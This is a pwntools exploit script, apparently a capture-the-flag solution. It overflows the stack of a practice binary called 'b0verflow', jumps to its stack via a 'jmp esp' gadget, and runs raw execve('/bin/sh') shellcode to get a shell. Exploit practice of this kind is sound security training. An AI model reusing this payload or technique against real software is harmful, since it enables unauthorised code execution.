'''
Author: Samrito
Date: 2022-03-18 11:18:18
LastEditors: Samrito
LastEditTime: 2022-03-18 11:31:50
'''
from pwn import *


def debug(argv=''):
    gdb.attach(io, argv)
    pause()


#use hint is also ok
hint_1 = 0x80484FD  #push ebp; mov ebp, esp; sub esp, 0x24; ret;
hint_2 = 0x8048504  #jump esp;

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

io = process(argv=['./b0verflow'])

debug('b * main')
shellcode = b'\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x31\xc9\x6a\x0b\x58\xcd\x80'
payload = flat([hint_2, shellcode, b'@' * (0x20 - len(shellcode)), hint_1])

io.recvuntil(b"What's your name?\n")
io.sendline(payload)
io.interactive()